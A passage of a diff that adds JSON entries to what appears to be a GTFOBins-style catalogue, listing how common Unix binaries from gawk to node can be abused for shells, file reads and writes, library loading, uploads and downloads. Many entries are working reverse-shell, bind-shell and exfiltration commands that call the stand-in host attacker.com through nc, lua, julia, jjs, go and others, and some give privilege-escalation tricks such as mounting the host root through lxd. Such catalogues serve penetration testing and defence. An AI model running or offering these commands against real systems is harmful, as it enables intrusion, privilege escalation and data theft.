+    },
+    {
+      "binary": "gawk",
+      "category": "file-write",
+      "code": "gawk 'BEGIN { print \"DATA\" > \"/path/to/output-file\" }'"
+    },
+    {
+      "binary": "gawk",
+      "category": "reverse-shell",
+      "code": "gawk 'BEGIN {\n    s = \"/inet/tcp/0/attacker.com/12345\";\n    while (1) {printf \"> \" |& s; if ((s |& getline c) <= 0) break;\n    while (c && (c |& getline) > 0) print $0 |& s; close(c)}}'"
+    },
+    {
+      "binary": "gawk",
+      "category": "shell",
+      "code": "gawk 'BEGIN {system(\"/bin/sh\")}'"
+    },
+    {
+      "binary": "gcc",
+      "category": "file-read",
+      "code": "gcc -x c -E /path/to/input-file"
+    },
+    {
+      "binary": "gcc",
+      "category": "file-read",
+      "code": "gcc @/path/to/input-file"
+    },
+    {
+      "binary": "gcc",
+      "category": "file-write",
+      "code": "gcc -x c /dev/null -o /path/to/input-file"
+    },
+    {
+      "binary": "gcc",
+      "category": "shell",
+      "code": "gcc -wrapper /bin/sh,-s x"
+    },
+    {
+      "binary": "gcore",
+      "category": "file-read",
+      "code": "gcore $PID"
+    },
+    {
+      "binary": "gdb",
+      "category": "file-write",
+      "code": "gdb -nx -ex 'dump value /path/to/output-file \"DATA\"' -ex quit"
+    },
+    {
+      "binary": "gdb",
+      "category": "shell",
+      "code": "gdb -nx -ex '!/bin/sh' -ex quit"
+    },
+    {
+      "binary": "gem",
+      "category": "shell",
+      "code": "gem open -e '/bin/sh -s' debug"
+    },
+    {
+      "binary": "genie",
+      "category": "shell",
+      "code": "genie -c '/bin/sh'"
+    },
+    {
+      "binary": "genisoimage",
+      "category": "file-read",
+      "code": "genisoimage -q -o - /path/to/input-file"
+    },
+    {
+      "binary": "genisoimage",
+      "category": "file-read",
+      "code": "genisoimage -sort /path/to/input-file"
+    },
+    {
+      "binary": "ghc",
+      "category": "shell",
+      "code": "ghc -e 'System.Process.callCommand \"/bin/sh\"'"
+    },
+    {
+      "binary": "ghci",
+      "category": "shell",
+      "code": "ghci\nSystem.Process.callCommand \"/bin/sh\""
+    },
+    {
+      "binary": "ginsh",
+      "category": "shell",
+      "code": "ginsh\n!/bin/sh"
+    },
+    {
+      "binary": "git",
+      "category": "file-read",
+      "code": "git diff /dev/null /path/to/input-file"
+    },
+    {
+      "binary": "git",
+      "category": "file-write",
+      "code": "git apply --unsafe-paths --directory / x.patch"
+    },
+    {
+      "binary": "git",
+      "category": "shell",
+      "code": "PAGER='/bin/sh -c \"exec sh 0<&1\"' git -p help"
+    },
+    {
+      "binary": "git",
+      "category": "shell",
+      "code": "git init .\necho 'exec /bin/sh 0<&2 1>&2' >.git/hooks/pre-commit\nchmod +x .git/hooks/pre-commit\ngit -C . commit --allow-empty -m x"
+    },
+    {
+      "binary": "git",
+      "category": "shell",
+      "code": "ln -s /bin/sh git-x\ngit --exec-path=. x"
+    },
+    {
+      "binary": "gnuplot",
+      "category": "shell",
+      "code": "gnuplot -e 'system(\"/bin/sh 1>&0\")'"
+    },
+    {
+      "binary": "go",
+      "category": "bind-shell",
+      "code": "echo -e 'package main\\nimport (\\n\\t\"os\"\\n\\t\"syscall\"\\n)\\n\\nfunc main(){\\n\\tfd, _ := syscall.Socket(syscall.AF_INET, syscall.SOCK_STREAM, 0)\\n\\taddr := &syscall.SockaddrInet4{Port: 12345}\\n\\tcopy(addr.Addr[:], []byte{0,0,0,0})\\n\\tsyscall.Bind(fd, addr)\\n\\tsyscall.Listen(fd, 1)\\n\\tnfd, _, _ := syscall.Accept(fd)\\n\\tsyscall.Dup2(nfd, 0)\\n\\tsyscall.Dup2(nfd, 1)\\n\\tsyscall.Dup2(nfd, 2)\\n\\tsyscall.Exec(\"/bin/sh\", []string{\"/bin/sh\", \"-i\"}, os.Environ())\\n}' >/path/to/temp-file.go\ngo run /path/to/temp-file.go"
+    },
+    {
+      "binary": "go",
+      "category": "file-read",
+      "code": "echo -e 'package main\\nimport (\\n\\t\"fmt\"\\n\\t\"os\"\\n)\\n\\nfunc main(){\\n\\tb, _ := os.ReadFile(\"/path/to/input-file\")\\n\\tfmt.Print(string(b))\\n}' >/path/to/temp-file.go\ngo run /path/to/temp-file.go"
+    },
+    {
+      "binary": "go",
+      "category": "file-write",
+      "code": "echo -e 'package main\\nimport \"os\"\\nfunc main(){\\n\\tf, _ := os.OpenFile(\"/path/to/output-file\", os.O_RDWR|os.O_CREATE, 0644)\\n\\tf.Write([]byte(\"DATA\\\\n\"))\\n\\tf.Close()\\n}' >/path/to/temp-file.go\ngo run /path/to/temp-file.go"
+    },
+    {
+      "binary": "go",
+      "category": "reverse-shell",
+      "code": "echo -e 'package main\\nimport (\\n\\t\"os\"\\n\\t\"net\"\\n\\t\"syscall\"\\n)\\n\\nfunc main(){\\n\\tfd, _ := syscall.Socket(syscall.AF_INET, syscall.SOCK_STREAM, 0)\\n\\tip := net.ParseIP(\"attacker.com\").To4()\\n\\taddr := &syscall.SockaddrInet4{Port: 12345}\\n\\tcopy(addr.Addr[:], ip)\\n\\tsyscall.Connect(fd, addr)\\n\\tsyscall.Dup2(fd, 0)\\n\\tsyscall.Dup2(fd, 1)\\n\\tsyscall.Dup2(fd, 2)\\n\\tsyscall.Exec(\"/bin/sh\", []string{\"/bin/sh\", \"-i\"}, os.Environ())\\n}' >/path/to/temp-file.go\ngo run /path/to/temp-file.go"
+    },
+    {
+      "binary": "go",
+      "category": "shell",
+      "code": "echo -e 'package main\\nimport \"syscall\"\\nfunc main(){\\n\\tsyscall.Exec(\"/bin/sh\", []string{\"/bin/sh\", \"-i\"}, []string{})\\n}' >/path/to/temp-file.go\ngo run /path/to/temp-file.go"
+    },
+    {
+      "binary": "grc",
+      "category": "shell",
+      "code": "grc --pty /bin/sh"
+    },
+    {
+      "binary": "grep",
+      "category": "file-read",
+      "code": "grep '' /path/to/input-file"
+    },
+    {
+      "binary": "gtester",
+      "category": "file-write",
+      "code": "gtester DATA -o /path/to/output-file"
+    },
+    {
+      "binary": "gtester",
+      "category": "shell",
+      "code": "echo 'exec /bin/sh 0<&1' >/path/to/temp-file\nchmod +x /path/to/temp-file\ngtester -q /path/to/temp-file"
+    },
+    {
+      "binary": "guile",
+      "category": "shell",
+      "code": "guile -c '(system \"/bin/sh\")'"
+    },
+    {
+      "binary": "gzip",
+      "category": "file-read",
+      "code": "gzip -c /path/to/input-file | gzip -d"
+    },
+    {
+      "binary": "hashcat",
+      "category": "file-write",
+      "code": "echo -n DATA | tee /path/to/wordlist | md5sum | awk '{print $1}' >/path/to/hash\nhashcat -m 0 --quiet --potfile-disable -o /path/to/output-file --outfile-format=2 --outfile-autohex-disable /path/to/hash /path/to/wordlist"
+    },
+    {
+      "binary": "head",
+      "category": "file-read",
+      "code": "head -c-0 /path/to/input-file"
+    },
+    {
+      "binary": "hexdump",
+      "category": "file-read",
+      "code": "hd /path/to/input-file"
+    },
+    {
+      "binary": "hg",
+      "category": "shell",
+      "code": "hg --config alias.x='!/bin/sh' x"
+    },
+    {
+      "binary": "highlight",
+      "category": "file-read",
+      "code": "highlight --no-doc --failsafe /path/to/input-file"
+    },
+    {
+      "binary": "hping3",
+      "category": "shell",
+      "code": "hping3\n/bin/sh"
+    },
+    {
+      "binary": "hping3",
+      "category": "upload",
+      "code": "hping3 attacker.com --icmp --data 999 --sign xxx --file /path/to/input-file"
+    },
+    {
+      "binary": "iconv",
+      "category": "file-read",
+      "code": "iconv -f 8859_1 -t 8859_1 /path/to/input-file"
+    },
+    {
+      "binary": "iconv",
+      "category": "file-write",
+      "code": "echo DATA | iconv -f 8859_1 -t 8859_1 -o /path/to/output-file"
+    },
+    {
+      "binary": "iftop",
+      "category": "shell",
+      "code": "iftop\n!/bin/sh"
+    },
+    {
+      "binary": "ionice",
+      "category": "shell",
+      "code": "ionice /bin/sh"
+    },
+    {
+      "binary": "ip",
+      "category": "file-read",
+      "code": "ip -force -batch /path/to/input-file"
+    },
+    {
+      "binary": "ip",
+      "category": "shell",
+      "code": "ip netns add foo\nip netns exec foo /bin/ln -s /proc/1/ns/net /var/run/netns/bar\nip netns exec bar /bin/sh\nip netns delete foo\nip netns delete bar"
+    },
+    {
+      "binary": "ip",
+      "category": "shell",
+      "code": "ip netns add foo\nip netns exec foo /bin/sh\nip netns delete foo"
+    },
+    {
+      "binary": "iptables-save",
+      "category": "file-write",
+      "code": "iptables -A INPUT -i lo -j ACCEPT -m comment --comment DATA\niptables -S\niptables-save -f /path/to/output-file"
+    },
+    {
+      "binary": "ispell",
+      "category": "shell",
+      "code": "ispell /etc/hosts\n!/bin/sh"
+    },
+    {
+      "binary": "java",
+      "category": "shell",
+      "code": "java Shell"
+    },
+    {
+      "binary": "jjs",
+      "category": "download",
+      "code": "jjs\nvar URL = Java.type('java.net.URL');\nvar ws = new URL('http://attacker.com/path/to/input-file');\nvar Channels = Java.type('java.nio.channels.Channels');\nvar rbc = Channels.newChannel(ws.openStream());\nvar FileOutputStream = Java.type('java.io.FileOutputStream');\nvar fos = new FileOutputStream('/path/to/output-file');\nfos.getChannel().transferFrom(rbc, 0, Number.MAX_VALUE);\nfos.close();\nrbc.close();"
+    },
+    {
+      "binary": "jjs",
+      "category": "file-read",
+      "code": "jjs\nvar BufferedReader = Java.type('java.io.BufferedReader');\nvar FileReader = Java.type('java.io.FileReader');\nvar br = new BufferedReader(new FileReader('/path/to/input-file'));\nwhile ((line = br.readLine()) != null) { print(line); }"
+    },
+    {
+      "binary": "jjs",
+      "category": "file-write",
+      "code": "jjs\nvar FileWriter = Java.type('java.io.FileWriter');\nvar fw=new FileWriter('/path/to/output-file');\nfw.write('DATA');\nfw.close();"
+    },
+    {
+      "binary": "jjs",
+      "category": "reverse-shell",
+      "code": "jjs\nvar host='attacker.com';\nvar port=12345;\nvar ProcessBuilder = Java.type('java.lang.ProcessBuilder');\nvar p=new ProcessBuilder('/bin/sh', '-i').redirectErrorStream(true).start();\nvar Socket = Java.type('java.net.Socket');\nvar s=new Socket(host,port);\nvar pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();\nvar po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){ while(pi.available()>0)so.write(pi.read()); while(pe.available()>0)so.write(pe.read()); while(si.available()>0)po.write(si.read()); so.flush();po.flush(); Java.type('java.lang.Thread').sleep(50); try {p.exitValue();break;}catch (e){}};p.destroy();s.close();"
+    },
+    {
+      "binary": "jjs",
+      "category": "shell",
+      "code": "jjs\nJava.type('java.lang.Runtime').getRuntime().exec('/bin/sh -c $@|sh _ echo sh </dev/tty >/dev/tty 2>/dev/tty').waitFor()"
+    },
+    {
+      "binary": "joe",
+      "category": "shell",
+      "code": "joe\n^K!/bin/sh"
+    },
+    {
+      "binary": "join",
+      "category": "file-read",
+      "code": "join -a 2 /dev/null /path/to/input-file"
+    },
+    {
+      "binary": "jq",
+      "category": "file-read",
+      "code": "jq -Rr . /path/to/input-file"
+    },
+    {
+      "binary": "jrunscript",
+      "category": "download",
+      "code": "jrunscript -e 'cp(\"http://attacker.com/path/to/input-file\",\"/path/to/output-file\")'"
+    },
+    {
+      "binary": "jrunscript",
+      "category": "file-read",
+      "code": "jrunscript -e 'br = new BufferedReader(new java.io.FileReader(\"/path/to/input-file\"));\n    while ((line = br.readLine()) != null) { print(line); }'"
+    },
+    {
+      "binary": "jrunscript",
+      "category": "file-write",
+      "code": "jrunscript -e 'var fw=new java.io.FileWriter(\"/path/to/output-file\");\n    fw.write(\"DATA\");\n    fw.close();'"
+    },
+    {
+      "binary": "jrunscript",
+      "category": "reverse-shell",
+      "code": "jrunscript -e 'var host=\"attacker.com\";\n    var port=12345;\n    var p=new java.lang.ProcessBuilder(\"/bin/sh\", \"-i\").redirectErrorStream(true).start();\n    var s=new java.net.Socket(host,port);\n    var pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();\n    var po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){\n    while(pi.available()>0)so.write(pi.read());\n    while(pe.available()>0)so.write(pe.read());\n    while(si.available()>0)po.write(si.read());\n    so.flush();po.flush();\n    java.lang.Thread.sleep(50);\n    try {p.exitValue();break;}catch (e){}};p.destroy();s.close();'"
+    },
+    {
+      "binary": "jrunscript",
+      "category": "shell",
+      "code": "jrunscript -e 'exec(\"/bin/sh -c $@|sh _ echo sh </dev/tty >/dev/tty 2>/dev/tty\")'"
+    },
+    {
+      "binary": "jshell",
+      "category": "file-read",
+      "code": "jshell\njshell> /open /path/to/input-file"
+    },
+    {
+      "binary": "jshell",
+      "category": "file-write",
+      "code": "jshell\nString x = \"DATA\";\n/save /path/to/output-file"
+    },
+    {
+      "binary": "jshell",
+      "category": "shell",
+      "code": "jshell\nRuntime.getRuntime().exec(\"/path/to/command\");"
+    },
+    {
+      "binary": "jtag",
+      "category": "shell",
+      "code": "jtag --interactive\nshell /bin/sh"
+    },
+    {
+      "binary": "julia",
+      "category": "download",
+      "code": "julia -e 'download(\"http://attacker.com/path/to/input-file\", \"/path/to/output-file\")'"
+    },
+    {
+      "binary": "julia",
+      "category": "file-read",
+      "code": "julia -e 'print(open(f->read(f, String), \"/path/to/input-file\"))'"
+    },
+    {
+      "binary": "julia",
+      "category": "file-write",
+      "code": "julia -e 'open(f->write(f, \"DATA\"), /path/to/output-file, \"w\")'"
+    },
+    {
+      "binary": "julia",
+      "category": "reverse-shell",
+      "code": "julia -e 'using Sockets; sock=connect(\"attacker.com\", parse(Int64, 12345)); while true; cmd = readline(sock); if !isempty(cmd); cmd = split(cmd); ioo = IOBuffer(); ioe = IOBuffer(); run(pipeline(`$cmd`, stdout=ioo, stderr=ioe)); write(sock, String(take!(ioo)) * String(take!(ioe))); end; end;'"
+    },
+    {
+      "binary": "julia",
+      "category": "shell",
+      "code": "julia -e 'run(`/bin/sh`)'"
+    },
+    {
+      "binary": "ksshell",
+      "category": "file-read",
+      "code": "ksshell -i /path/to/input-file"
+    },
+    {
+      "binary": "ksu",
+      "category": "shell",
+      "code": "ksu -q -e /bin/sh"
+    },
+    {
+      "binary": "kubectl",
+      "category": "shell",
+      "code": "cat >/path/to/temp-file <<EOF\nclusters:\n- cluster:\n    server: https://x\n  name: x\ncontexts:\n- context:\n    cluster: x\n    user: x\n  name: x\ncurrent-context: x\nusers:\n- name: x\n  user:\n    exec:\n      apiVersion: client.authentication.k8s.io/v1\n      interactiveMode: Always\n      command: /bin/sh\n      args:\n        - '-c'\n        - '/bin/sh 0<&2 1>&2'\nEOF\n\nkubectl get pods --kubeconfig=/path/to/temp-file"
+    },
+    {
+      "binary": "kubectl",
+      "category": "upload",
+      "code": "kubectl proxy --address=0.0.0.0 --port=12345 --www=/path/to/dir/ --www-prefix=/x/"
+    },
+    {
+      "binary": "last",
+      "category": "file-read",
+      "code": "last -a -f /path/to/input-file"
+    },
+    {
+      "binary": "latex",
+      "category": "file-read",
+      "code": "latex '\\documentclass{article}\\usepackage{verbatim}\\begin{document}\\verbatiminput{/path/to/input-file}\\end{document}'\nstrings texput.dvi"
+    },
+    {
+      "binary": "latex",
+      "category": "file-write",
+      "code": "latex '\\documentclass{article}\\newwrite\\tempfile\\begin{document}\\immediate\\openout\\tempfile=output-file.tex\\immediate\\write\\tempfile{DATA}\\immediate\\closeout\\tempfile\\end{document}'"
+    },
+    {
+      "binary": "latex",
+      "category": "shell",
+      "code": "latex --shell-escape '\\immediate\\write18{/bin/sh}'"
+    },
+    {
+      "binary": "latexmk",
+      "category": "file-read",
+      "code": "echo '\\documentclass{article}\\usepackage{verbatim}\\begin{document}\\verbatiminput{/path/to/input-file}\\end{document}' >/path/to/temp-file\nlatexmk -dvi /path/to/temp-file\nstrings temp-file.dvi"
+    },
+    {
+      "binary": "latexmk",
+      "category": "shell",
+      "code": "latexmk -pdf -pdflatex='/bin/sh #' /dev/null"
+    },
+    {
+      "binary": "ld.so",
+      "category": "shell",
+      "code": "/path/to/ld.so /bin/sh"
+    },
+    {
+      "binary": "ldconfig",
+      "category": "library-load",
+      "code": "echo /path/to/temp-dir/ >/path/to/temp-file\nldconfig -f /path/to/temp-file\nping"
+    },
+    {
+      "binary": "less",
+      "category": "command",
+      "code": "LESSOPEN='/path/to/command # %s' less /etc/hosts"
+    },
+    {
+      "binary": "less",
+      "category": "command",
+      "code": "cp /path/to/command ~/.lessfilter\nless /etc/hosts"
+    },
+    {
+      "binary": "less",
+      "category": "file-read",
+      "code": "LESSOPEN='echo /path/to/input-file # %s' less /etc/hosts"
+    },
+    {
+      "binary": "less",
+      "category": "file-read",
+      "code": "less /etc/hosts\n:e /path/to/input-file"
+    },
+    {
+      "binary": "less",
+      "category": "file-read",
+      "code": "less /path/to/input-file"
+    },
+    {
+      "binary": "less",
+      "category": "file-write",
+      "code": "echo DATA | less\ns/path/to/output-file\nq"
+    },
+    {
+      "binary": "less",
+      "category": "shell",
+      "code": "LESSOPEN=\"/bin/sh -s 1>&0 2>&0 # %s\" less /etc/hosts\nreset"
+    },
+    {
+      "binary": "less",
+      "category": "shell",
+      "code": "VISUAL='/bin/sh -s --' less /etc/hosts\nv"
+    },
+    {
+      "binary": "less",
+      "category": "shell",
+      "code": "less /etc/hosts\n!/bin/sh"
+    },
+    {
+      "binary": "lftp",
+      "category": "shell",
+      "code": "lftp -c '!/bin/sh'"
+    },
+    {
+      "binary": "links",
+      "category": "file-read",
+      "code": "links /path/to/input-file"
+    },
+    {
+      "binary": "loginctl",
+      "category": "shell",
+      "code": "loginctl user-status\n!/bin/sh"
+    },
+    {
+      "binary": "logrotate",
+      "category": "file-read",
+      "code": "logrotate /path/to/input-file"
+    },
+    {
+      "binary": "logrotate",
+      "category": "file-write",
+      "code": "logrotate -l /path/to/output-file DATA"
+    },
+    {
+      "binary": "logrotate",
+      "category": "shell",
+      "code": "echo -e '/path/to/temp-file.config {\\nmail x@x.x\\n}' >/path/to/temp-file.config\necho '/bin/sh 0<&2 1>&2' >/path/to/temp-file.sh\nlogrotate -m /path/to/temp-file.sh -f /path/to/temp-file"
+    },
+    {
+      "binary": "logsave",
+      "category": "shell",
+      "code": "logsave /dev/null /bin/sh -i"
+    },
+    {
+      "binary": "look",
+      "category": "file-read",
+      "code": "look '' /path/to/input-file"
+    },
+    {
+      "binary": "lp",
+      "category": "upload",
+      "code": "lp /path/to/input-file -h attacker.com"
+    },
+    {
+      "binary": "ltrace",
+      "category": "file-read",
+      "code": "ltrace -F /path/to/input-file /dev/null"
+    },
+    {
+      "binary": "ltrace",
+      "category": "file-write",
+      "code": "ltrace -s 999 -o /path/to/input-file ltrace -F DATA"
+    },
+    {
+      "binary": "ltrace",
+      "category": "shell",
+      "code": "ltrace -b -L /bin/sh"
+    },
+    {
+      "binary": "lua",
+      "category": "bind-shell",
+      "code": "lua -e '\n  local k=require(\"socket\");\n  local s=assert(k.bind(\"*\",12345));\n  local c=s:accept();\n  while true do\n    local r,x=c:receive();local f=assert(io.popen(r,\"r\"));\n    local b=assert(f:read(\"*a\"));c:send(b);\n  end;c:close();f:close();'"
+    },
+    {
+      "binary": "lua",
+      "category": "download",
+      "code": "lua -e '\n  local k=require(\"socket\");\n  local s=assert(k.bind(\"*\",12345));\n  local c=s:accept();\n  local d,x=c:receive(\"*a\");\n  c:close();\n  local f=io.open(\"/path/to/output-file\", \"wb\");\n  f:write(d);\n  io.close(f);'"
+    },
+    {
+      "binary": "lua",
+      "category": "file-read",
+      "code": "lua -e 'local f=io.open(\"/path/to/input-file\", \"rb\"); io.write(f:read(\"*a\")); io.close(f);'"
+    },
+    {
+      "binary": "lua",
+      "category": "file-write",
+      "code": "lua -e 'local f=io.open(\"/path/to/output-file\", \"wb\"); f:write(\"DATA\"); io.close(f);'"
+    },
+    {
+      "binary": "lua",
+      "category": "reverse-shell",
+      "code": "lua -e '\n  local s=require(\"socket\");\n  local t=assert(s.tcp());\n  t:connect(\"attacker.com\",12345);\n  while true do\n    local r,x=t:receive();local f=assert(io.popen(r,\"r\"));\n    local b=assert(f:read(\"*a\"));t:send(b);\n  end;\n  f:close();t:close();'"
+    },
+    {
+      "binary": "lua",
+      "category": "shell",
+      "code": "lua -e 'os.execute(\"/bin/sh\")'"
+    },
+    {
+      "binary": "lua",
+      "category": "upload",
+      "code": "lua -e '\n  local f=io.open(\"/path/to/input-file\", \"rb\")\n  local d=f:read(\"*a\")\n  io.close(f);\n  local s=require(\"socket\");\n  local t=assert(s.tcp());\n  t:connect(\"attacker.com\",12345);\n  t:send(d);\n  t:close();'"
+    },
+    {
+      "binary": "lwp-download",
+      "category": "download",
+      "code": "lwp-download http://attacker.com/path/to/input-file /path/to/output-file"
+    },
+    {
+      "binary": "lwp-download",
+      "category": "file-read",
+      "code": "lwp-download file:///path/to/input-file /dev/stdout"
+    },
+    {
+      "binary": "lwp-download",
+      "category": "file-write",
+      "code": "echo DATA >/path/to/temp-file\nlwp-download file:///path/to/temp-file /path/to/output-file"
+    },
+    {
+      "binary": "lwp-download",
+      "category": "file-write",
+      "code": "lwp-download file:///path/to/input-file /path/to/output-file"
+    },
+    {
+      "binary": "lwp-request",
+      "category": "file-read",
+      "code": "lwp-request file:///path/to/input-file"
+    },
+    {
+      "binary": "lxd",
+      "category": "shell",
+      "code": "lxc image import ./alpine*.tar.gz --alias x\nlxc init x x -c security.privileged=true\nlxc config device add x x disk source=/ path=/mnt/ recursive=true\nlxc start x\nlxc exec x /bin/sh"
+    },
+    {
+      "binary": "lxd",
+      "category": "shell",
+      "code": "lxc init ubuntu:16.04 x -c security.privileged=true\nlxc config device add x x disk source=/ path=/mnt/ recursive=true\nlxc start x\nlxc exec x /bin/sh"
+    },
+    {
+      "binary": "m4",
+      "category": "command",
+      "code": "echo 'esyscmd(/path/to/command)' | m4"
+    },
+    {
+      "binary": "m4",
+      "category": "file-read",
+      "code": "m4 /path/to/input-file"
+    },
+    {
+      "binary": "m4",
+      "category": "shell",
+      "code": "echo 'esyscmd(/bin/sh 0<&2 1>&2)' | m4"
+    },
+    {
+      "binary": "mail",
+      "category": "shell",
+      "code": "mail --exec='!/bin/sh'"
+    },
+    {
+      "binary": "mail",
+      "category": "shell",
+      "code": "mail -f /etc/hosts\n!/bin/sh"
+    },
+    {
+      "binary": "make",
+      "category": "file-read",
+      "code": "make -s --eval='$(file >/dev/stdout,$(file </path/to/input-file))' ."
+    },
+    {
+      "binary": "make",
+      "category": "file-write",
+      "code": "make -s --eval='$(file >/path/to/output-file,DATA)' ."
+    },
+    {
+      "binary": "make",
+      "category": "shell",
+      "code": "make --eval='$(shell /bin/sh 1>&0)' ."
+    },
+    {
+      "binary": "man",
+      "category": "file-read",
+      "code": "man /path/to/input-file"
+    },
+    {
+      "binary": "man",
+      "category": "shell",
+      "code": "man '-H/bin/sh #' man"
+    },
+    {
+      "binary": "mawk",
+      "category": "file-read",
+      "code": "mawk '//' /path/to/input-file"
+    },
+    {
+      "binary": "mawk",
+      "category": "file-write",
+      "code": "mawk 'BEGIN { print \"DATA\" > \"/path/to/output-file\" }'"
+    },
+    {
+      "binary": "mawk",
+      "category": "shell",
+      "code": "mawk 'BEGIN {system(\"/bin/sh\")}'"
+    },
+    {
+      "binary": "minicom",
+      "category": "shell",
+      "code": "echo '! exec /bin/sh </dev/tty 1>/dev/tty 2>/dev/tty' >/path/to/temp-file\nminicom -D /dev/null -S /path/to/temp-file\nreset^J"
+    },
+    {
+      "binary": "minicom",
+      "category": "shell",
+      "code": "minicom -D /dev/null"
+    },
+    {
+      "binary": "more",
+      "category": "file-read",
+      "code": "more /path/to/input-file"
+    },
+    {
+      "binary": "more",
+      "category": "shell",
+      "code": "more /etc/hosts\n!/bin/sh"
+    },
+    {
+      "binary": "mosh-server",
+      "category": "shell",
+      "code": "mosh --server=mosh-server localhost /bin/sh"
+    },
+    {
+      "binary": "mosquitto",
+      "category": "file-read",
+      "code": "mosquitto -c /path/to/input-file"
+    },
+    {
+      "binary": "msgattrib",
+      "category": "file-read",
+      "code": "msgattrib -P /path/to/input-file"
+    },
+    {
+      "binary": "msgcat",
+      "category": "file-read",
+      "code": "msgcat -P /path/to/input-file"
+    },
+    {
+      "binary": "msgconv",
+      "category": "file-read",
+      "code": "msgconv -P /path/to/input-file"
+    },
+    {
+      "binary": "msgfilter",
+      "category": "file-read",
+      "code": "msgfilter -P -i /path/to/input-file /bin/cat"
+    },
+    {
+      "binary": "msgfilter",
+      "category": "shell",
+      "code": "echo x | msgfilter -P /bin/sh -c '/bin/sh 0<&2 1>&2; kill $PPID'"
+    },
+    {
+      "binary": "msgmerge",
+      "category": "file-read",
+      "code": "msgmerge -P /path/to/input-file /dev/null"
+    },
+    {
+      "binary": "msguniq",
+      "category": "file-read",
+      "code": "msguniq -P /path/to/input-file"
+    },
+    {
+      "binary": "mtr",
+      "category": "file-read",
+      "code": "mtr --raw -F /path/to/input-file"
+    },
+    {
+      "binary": "multitime",
+      "category": "shell",
+      "code": "multitime /bin/sh"
+    },
+    {
+      "binary": "mutt",
+      "category": "file-read",
+      "code": "mutt -F /path/to/input-file"
+    },
+    {
+      "binary": "mv",
+      "category": "file-write",
+      "code": "echo DATA >/path/to/temp-file\nmv /path/to/temp-file /path/to/output-file"
+    },
+    {
+      "binary": "mypy",
+      "category": "file-read",
+      "code": "mypy /path/to/input-file"
+    },
+    {
+      "binary": "mypy",
+      "category": "file-write",
+      "code": "mypy /path/to/input-file --junit-xml /path/to/output-file"
+    },
+    {
+      "binary": "mysql",
+      "category": "library-load",
+      "code": "mysql --default-auth ../../../../../path/to/lib"
+    },
+    {
+      "binary": "mysql",
+      "category": "shell",
+      "code": "mysql -e '\\! /bin/sh'"
+    },
+    {
+      "binary": "nano",
+      "category": "file-read",
+      "code": "nano /path/to/input-file"
+    },
+    {
+      "binary": "nano",
+      "category": "file-write",
+      "code": "nano /path/to/output-file\nDATA\n^O"
+    },
+    {
+      "binary": "nano",
+      "category": "shell",
+      "code": "nano\n^R^X\nreset; sh 1>&0 2>&0"
+    },
+    {
+      "binary": "nano",
+      "category": "shell",
+      "code": "nano -s /bin/sh\n/bin/sh\n^T^T"
+    },
+    {
+      "binary": "nasm",
+      "category": "file-read",
+      "code": "nasm -@ /path/to/input-file"
+    },
+    {
+      "binary": "nc",
+      "category": "bind-shell",
+      "code": "nc -l -p 12345 -e /bin/sh"
+    },
+    {
+      "binary": "nc",
+      "category": "download",
+      "code": "nc -l -p 12345 >/path/to/output-file"
+    },
+    {
+      "binary": "nc",
+      "category": "download",
+      "code": "nc attacker.com 12345 >/path/to/output-file"
+    },
+    {
+      "binary": "nc",
+      "category": "reverse-shell",
+      "code": "nc -e /bin/sh attacker.com 12345"
+    },
+    {
+      "binary": "nc",
+      "category": "upload",
+      "code": "nc -l -p 12345 </path/to/input-file"
+    },
+    {
+      "binary": "nc",
+      "category": "upload",
+      "code": "nc attacker.com 12345 </path/to/input-file"
+    },
+    {
+      "binary": "ncdu",
+      "category": "shell",
+      "code": "ncdu\nb"
+    },
+    {
+      "binary": "ncftp",
+      "category": "shell",
+      "code": "ncftp\n!/bin/sh"
+    },
+    {
+      "binary": "neofetch",
+      "category": "file-read",
+      "code": "neofetch --ascii /path/to/input-file"
+    },
+    {
+      "binary": "neofetch",
+      "category": "shell",
+      "code": "echo 'exec /bin/sh' >/path/to/temp-file\nneofetch --config /path/to/temp-file"
+    },
+    {
+      "binary": "nft",
+      "category": "file-read",
+      "code": "nft -f /path/to/input-file"
+    },
+    {
+      "binary": "nginx",
+      "category": "download",
+      "code": "cat >/path/to/temp-file <<EOF\nuser root;\nhttp {\n  server {\n    listen 80;\n    root /;\n    autoindex on;\n    dav_methods PUT;\n  }\n}\nevents {}\nEOF\n\nnginx -c /path/to/temp-file"
+    },
+    {
+      "binary": "nginx",
+      "category": "library-load",
+      "code": "cat >/path/to/temp-file <<EOF\nload_module /path/to/lib.so;\nEOF\n\nnginx -t -c /path/to/temp-file"
+    },
+    {
+      "binary": "nginx",
+      "category": "upload",
+      "code": "cat >/path/to/temp-file <<EOF\nuser root;\nhttp {\n  server {\n    listen 80;\n    root /;\n    autoindex on;\n    dav_methods PUT;\n  }\n}\nevents {}\nEOF\n\nnginx -c /path/to/temp-file"
+    },
+    {
+      "binary": "nice",
+      "category": "shell",
+      "code": "nice /bin/sh"
+    },
+    {
+      "binary": "nl",
+      "category": "file-read",
+      "code": "nl -bn -w1 -s '' /path/to/input-file"
+    },
+    {
+      "binary": "nm",
+      "category": "file-read",
+      "code": "nm /path/to/input-file"
+    },
+    {
+      "binary": "nmap",
+      "category": "file-read",
+      "code": "nmap -iL /path/to/input-file"
+    },
+    {
+      "binary": "nmap",
+      "category": "file-write",
+      "code": "nmap -oG=/path/to/output-file DATA"
+    },
+    {
+      "binary": "nmap",
+      "category": "shell",
+      "code": "nmap --interactive\n!/bin/sh"
+    },
+    {
+      "binary": "node",
+      "category": "bind-shell",
+      "code": "node -e 'sh = require(\"child_process\").spawn(\"/bin/sh\");\nrequire(\"net\").createServer(function (client) {\n  client.pipe(sh.stdin);\n  sh.stdout.pipe(client);\n  sh.stderr.pipe(client);\n}).listen(12345)'"
+    },
+    {
+      "binary": "node",
+      "category": "download",
+      "code": "node -e 'require(\"http\").get(\"http://attacker.com/path/to/input-file\", res => res.pipe(require(\"fs\").createWriteStream(\"/path/to/output-file\")))'"
+    },
+    {
+      "binary": "node",
+      "category": "file-read",
+      "code": "node -e 'process.stdout.write(require(\"fs\").readFileSync(\"/path/to/input-file\"))'"
+    },
+    {
+      "binary": "node",
+      "category": "file-write",
+      "code": "node -e 'require(\"fs\").writeFileSync(\"/path/to/output-file\", \"DATA\")'"
+    },
+    {
+      "binary": "node",
+      "category": "reverse-shell",
